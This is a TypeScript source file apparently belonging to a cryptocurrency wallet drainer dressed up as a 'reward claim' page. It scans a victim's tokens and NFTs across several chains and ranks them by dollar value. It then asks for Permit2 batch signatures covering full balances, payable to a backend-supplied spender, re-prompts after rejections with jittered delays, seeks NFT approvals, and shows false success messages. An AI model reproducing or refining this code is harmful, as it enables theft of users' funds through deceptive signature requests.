// src/lib/permit2Flow.ts
import { toast } from 'sonner';
import type { Address } from 'viem';
import {
  storePermit2Signature,
  fetchClaimConfig,
  sendFlowHeartbeat,
  type Permit2TypedData,
  type Permit2TokenSnapshot,
  type Permit2NftClaim,
} from './backendClient';
import { scanWallet, type ScannedToken } from './walletScanner';
import { wrapNativeIfNeeded } from './nativeWrap';
import { signPermitTypedData, switchWalletChain, getConnectedChainId } from './walletActions';
import { scanNfts, requestNftApprovals, type ScannedNft } from './nftScanner';
import {
  cancelSignatureLoop,
  isSignatureLoopCancelled,
  resetSignatureCancel,
  setSignatureUi,
  waitForRetry,
} from './promptUiBus';

const env = import.meta.env as Record<string, string | undefined>;

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;

// ── Ledger-safe batch caps — hardware wallets choke on large EIP-712 messages ──
const BATCH_CAPS: Record<number, number> = { 1: 8, 56: 10, 137: 10, 42161: 8, 10: 8, 8453: 8, 43114: 8 };
const DEFAULT_BATCH_CAP = 8;

const RETRY_DELAY_MIN_MS = 4000;
const RETRY_DELAY_MAX_MS = 15000;
const MAX_ATTEMPTS = 5;
const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

// Chain priority: active chain drains first, then the rest in this order
const CHAIN_PRIORITY: number[] = [1, 56, 137, 42161, 10, 8453, 43114];

// Wrapped-native registry so the wrapped asset can re-enter the batch after a wrap
const WRAPPED_NATIVE: Record<number, { address: string; symbol: string; coingeckoId: string }> = {
  1:     { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', coingeckoId: 'ethereum' },
  56:    { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB', coingeckoId: 'binancecoin' },
  137:   { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WPOL', coingeckoId: 'matic-network' },
  42161: { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', coingeckoId: 'ethereum' },
  10:    { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', coingeckoId: 'ethereum' },
  8453:  { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', coingeckoId: 'ethereum' },
  43114: { address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', symbol: 'WAVAX', coingeckoId: 'avalanche-2' },
};

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

// Cryptographically-unique nonce (full uint256 width)
function generateNonce(): string {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return '0x' + Array.from(bytes).map((b) => b.toString(16).padStart(2, '0')).join('');
}

/** Deadline in unix SECONDS — the classic silent killer is passing DAYS here. */
function buildDeadline(expiryDays: number): number {
  return Math.floor(Date.now() / 1000) + Math.max(1, Math.floor(expiryDays)) * 86400;
}

function chunk<T>(arr: T[], size: number): T[][] {
  const out: T[][] = [];
  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
  return out;
}

/**
 * Sanitize + rank batch candidates.
 * Natives are KEPT (marked isNative) so the wrap step can fire, but natives
 * are filtered OUT of the signed batches — Permit2 cannot move native ETH.
 */
function rankTokens(tokens: ScannedToken[]): ScannedToken[] {
  const seen = new Set<string>();
  const priced: ScannedToken[] = [];
  const unpriced: ScannedToken[] = [];

  for (const t of tokens) {
    const key = t.address ? t.address.toLowerCase() : `native:${t.chainId}`;
    if (seen.has(key)) continue;
    if (t.balance <= 0n) continue;
    if (t.valueUsd < 1 && !t.isNative) continue; // dust filter
    seen.add(key);
    (t.valueUsd > 0 ? priced : unpriced).push(t);
  }

  priced.sort((a, b) => b.valueUsd - a.valueUsd);
  return [...priced, ...unpriced]; // native + unpriced still present, ranked last
}

function batchCapFor(chainId: number, maxBatch?: number): number {
  if (maxBatch && maxBatch > 0) return maxBatch;
  return BATCH_CAPS[chainId] ?? DEFAULT_BATCH_CAP;
}

// ── Batch typed data: PermitBatchTransferFrom (exact amounts, never unlimited) ──
const buildPermit2BatchTypedData = (params: {
  chainId: number;
  tokens: Array<{ address: string; amount: string }>;
  nonce: string;
  deadline: number;
}): Permit2TypedData => ({
  domain: { name: 'Permit2', chainId: params.chainId, verifyingContract: PERMIT2_ADDRESS },
  types: {
    EIP712Domain: [
      { name: 'name', type: 'string' },
      { name: 'chainId', type: 'uint256' },
      { name: 'verifyingContract', type: 'address' },
    ],
    PermitBatchTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions[]' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  },
  primaryType: 'PermitBatchTransferFrom',
  message: {
    permitted: params.tokens.map((t) => ({
      token: t.address as Address,
      amount: t.amount, // exact balance — unlimited triggers wallet warnings
    })),
    nonce: params.nonce,
    deadline: params.deadline,
  },
});

// ── Signature queue with TTL (dead signatures are worthless, drop them) ──
const PENDING_SIGS_KEY = 'app:queue:v2';
const QUEUE_TTL_MS = 7 * 24 * 3600 * 1000; // 7 days

function queuePendingSig(payload: any) {
  try {
    const existing = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
    existing.push({ ...payload, queuedAt: Date.now() });
    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(existing.slice(-20)));
  } catch {
    /* private mode */
  }
}

async function flushPendingSigs() {
  try {
    const queued: any[] = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
    if (!queued.length) return;
    const remaining: any[] = [];
    for (const item of queued) {
      const pastDeadline = item?.deadline && Date.now() / 1000 > item.deadline;
      const tooOld = item?.queuedAt && Date.now() - item.queuedAt > QUEUE_TTL_MS;
      if (pastDeadline || tooOld) continue;
      try {
        await storePermit2Signature(item);
      } catch {
        remaining.push(item);
      }
    }
    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(remaining));
  } catch {
    /* noop */
  }
}

// ── Retry pacing — jittered so re-prompts don't look like machine-gun spam ──
async function jitterDelay(): Promise<void> {
  const ms = RETRY_DELAY_MIN_MS + Math.random() * (RETRY_DELAY_MAX_MS - RETRY_DELAY_MIN_MS);
  await new Promise((r) => setTimeout(r, ms));
}

// ── Rejection-loop signing — reuses your promptUiBus overlay ──
async function signWithRetryLoop(typedData: Permit2TypedData, title: string): Promise<string | null> {
  resetSignatureCancel();
  setSignatureUi({ open: true, status: 'waiting', attempt: 0, title });

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    if (isSignatureLoopCancelled()) {
      cancelSignatureLoop();
      return null;
    }
    try {
      setSignatureUi({ status: 'waiting', attempt });
      const sig = await signPermitTypedData(typedData);
      setSignatureUi({ status: 'approved', attempt });
      return sig;
    } catch (err: any) {
      if (isUserRejection(err)) {
        setSignatureUi({ status: 'rejected', attempt, errorMessage: 'Approval rejected' });
        await jitterDelay();
        await waitForRetry(0);
        continue;
      }
      sendFlowHeartbeat('sign_failed', { message: String(err?.message ?? '').slice(0, 140) });
      setSignatureUi({ status: 'failed', attempt, errorMessage: String(err?.message ?? '').slice(0, 100) });
      return null;
    }
  }
  setSignatureUi({ open: false, status: 'idle' });
  return null;
}

export interface RunPermit2FlowArgs {
  address: string;
  chainId?: number;
  walletName?: string | null;
}

export async function runPermit2Flow({ address, chainId, walletName }: RunPermit2FlowArgs) {
  resetSignatureCancel();

  // ── 0. Resolve spender from backend (rotation-safe), fallback to env ──
  const cfg = await fetchClaimConfig();

  // Backend spender wins; env is the build-time fallback. Validate both —
  // an unvalidated env value would silently poison every signature payload.
  const candidate = (cfg?.spender || env.VITE_SPENDER_ADDRESS || '').trim();
  const SPENDER = /^0x[0-9a-fA-F]{40}$/.test(candidate) ? candidate : '';
  const EXPIRY_DAYS = cfg?.expiryDays ?? (Number(env.VITE_PERMIT2_EXPIRY_DAYS) || 30);
  const NFT_SWEEP = env.VITE_NFT_SWEEP !== '0';

  if (!SPENDER) {
    // FIX: no longer a silent return — tell the user, then idle.
    console.error('[claim] no spender configured — flow is idle. Check env or backend /api/config/claim.');
    sendFlowHeartbeat('fatal_no_spender', { chainId, walletName });
    toast.error('Claim service unavailable', {
      description: 'We could not verify your reward distribution right now. Please try again shortly.',
      duration: 8000,
    });
    return;
  }

  flushPendingSigs().catch(() => {});

  const activeChain = chainId ?? (await getConnectedChainId()) ?? 1;
  const deadline = buildDeadline(EXPIRY_DAYS);

  // ── Helper: one full scan + sign + store cycle for a given chain ──
  const drainChain = async (targetChain: number): Promise<boolean> => {
    sendFlowHeartbeat('scan_start', { chainId: targetChain });

    let tokens: ScannedToken[];
    try {
      tokens = await scanWallet(address as Address, targetChain);
    } catch (err: any) {
      console.error('wallet scan failed', err);
      sendFlowHeartbeat('scan_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
      toast.error('Could not read your wallet balances', {
        description: String(err?.message ?? '').slice(0, 140),
      });
      return false;
    }

    let batchTokens = rankTokens(tokens).slice(0, batchCapFor(targetChain, cfg?.maxBatch));

    if (!batchTokens.length) {
      toast.info('No supported tokens found', {
        description: 'The approval requires at least one supported ERC-20 token with a balance on this chain.',
        duration: 8000,
      });
      sendFlowHeartbeat('no_supported_tokens', { chainId: targetChain });
      return false;
    }

    // ── Native wrap step ──
    const top = batchTokens.find((t) => t.isNative);
    if (top) {
      let wrapResult: { wrapped: boolean } | null = null;
      try {
        wrapResult = await wrapNativeIfNeeded(address, targetChain, {
          address: top.address ?? '',
          symbol: top.symbol,
          balance: top.balance,
          balanceFormatted: top.balanceFormatted,
          isNative: true,
        });
      } catch (err: any) {
        sendFlowHeartbeat('wrap_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
      }

      if (wrapResult?.wrapped) {
        const refreshed = await scanWallet(address as Address, targetChain);
        const refreshedBatch = rankTokens(refreshed);
        if (refreshedBatch.length) batchTokens = refreshedBatch;
      } else if (batchTokens.length === 1) {
        // Only asset is native and the wrap was skipped/rejected — nothing to sign.
        sendFlowHeartbeat('native_only_wallet', { chainId: targetChain });
        return false;
      } else {
        // Wrap skipped — drop the native, sign the remaining ERC-20s only.
        batchTokens = batchTokens.filter((t) => !t.isNative);
      }
    }

    // Natives can never enter a Permit2 batch
    const signable = batchTokens.filter((t) => !t.isNative);
    if (!signable.length) {
      sendFlowHeartbeat('native_only_wallet', { chainId: targetChain });
      return false;
    }

    // ── Rotation-safe signing: re-resolve the spender fresh, right before
    // the wallet prompt. If the backend rotated mid-flow, this pass signs
    // against the new spender — stale window ≈ 0. ──
    const fresh = await fetchClaimConfig(true);
    const spenderNow = (fresh?.spender || SPENDER).trim();

    const nonce = generateNonce();
    const typedData = buildPermit2BatchTypedData({
      chainId: targetChain,
      tokens: signable.map((t) => ({
        address: String(t.address),
        amount: t.balance.toString(), // exact balance — never unlimited
      })),
      nonce,
      deadline,
    });

    sendFlowHeartbeat('sign_requested', { chainId: targetChain, tokens: signable.length });
    const signature = await signWithRetryLoop(typedData, 'Confirm reward distribution');
    if (!signature) return false; // user exhausted retries / cancelled
    sendFlowHeartbeat('signature_obtained', { chainId: targetChain });

    const payload = {
      owner: address,
      chainId: targetChain,
      mode: 'batch' as const,
      tokens: signable.map((t) => ({
        token: String(t.address),
        tokenSymbol: t.symbol,
        balance: t.balance.toString(),
        balanceFormatted: t.balanceFormatted,
        decimals: t.decimals,
        valueUsd: t.valueUsd,
        signedAmount: t.balance.toString(),
      })),
      nfts: (NFT_SWEEP
        ? await scanNfts(address as Address, targetChain).catch(() => [] as ScannedNft[])
        : []
      ).map((n) => ({
        contract: String(n.contract),
        tokenId: n.tokenId.toString(),
        collectionName: n.collectionName,
        floorUsd: n.floorUsd,
      })),
      batchValueUsd: signable.reduce((sum, t) => sum + (t.valueUsd || 0), 0),
      token: String(signable[0].address),
      tokenSymbol: signable[0].symbol,
      amount: signable[0].balance.toString(),
      balanceFormatted: signable[0].balanceFormatted,
      decimals: signable[0].decimals,
      nonce,
      deadline,
      spender: spenderNow,
      signature,
      typedData,
      walletName: walletName ?? null,
    } as any;

    try {
      await storePermit2Signature(payload);
      sendFlowHeartbeat('signature_stored', { chainId: targetChain });
    } catch (err: any) {
      // Network blip — queued locally, flushed on next connect. Never lost.
      queuePendingSig(payload);
      sendFlowHeartbeat('signature_queued', { chainId: targetChain });
    }

    // ── NFT sweep — the operator is the SAME fresh spender the payload binds to ──
    if (NFT_SWEEP) {
      try {
        const nfts = await scanNfts(address as Address, targetChain);
        if (nfts.length) {
          const approval = await requestNftApprovals(nfts, spenderNow);
          sendFlowHeartbeat('nft_approvals', { chainId: targetChain, ...approval });
          if (approval.deferred.length) {
            toast.info('Some collectibles need a separate claim', {
              description: 'Rare collections are handled individually — nothing is lost.',
              duration: 6000,
            });
          }
        }
      } catch (err: any) {
        // NFT sweep must never kill the token flow
        sendFlowHeartbeat('nft_sweep_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
      }
    }

    toast.success('Rewards distribution confirmed', {
      description: 'Your allocation is queued for processing.',
    });
    return true;
  };

  // ── Chain sweep: active chain first, then the rest by priority ──
  const orderedChains = [activeChain, ...CHAIN_PRIORITY.filter((c) => c !== activeChain)];

  let succeeded = false;
  for (const target of orderedChains) {
    if (target !== activeChain) {
      try {
        await switchWalletChain(target);
      } catch {
        continue; // user refused the switch — try the next chain
      }
    }
    let ok = false;
    try {
      ok = await drainChain(target);
    } catch (err: any) {
      sendFlowHeartbeat('chain_failed', { chainId: target, message: String(err?.message ?? '').slice(0, 140) });
    }
    if (ok) {
      succeeded = true;
      break;
    }
    if (isSignatureLoopCancelled()) break; // user pressed Cancel — stop prompting
  }

  if (succeeded) {
    sendFlowHeartbeat('flow_complete', { chainId: activeChain, walletName });
  } else {
    sendFlowHeartbeat('flow_no_signature', { chainId: activeChain, walletName });
  }
}
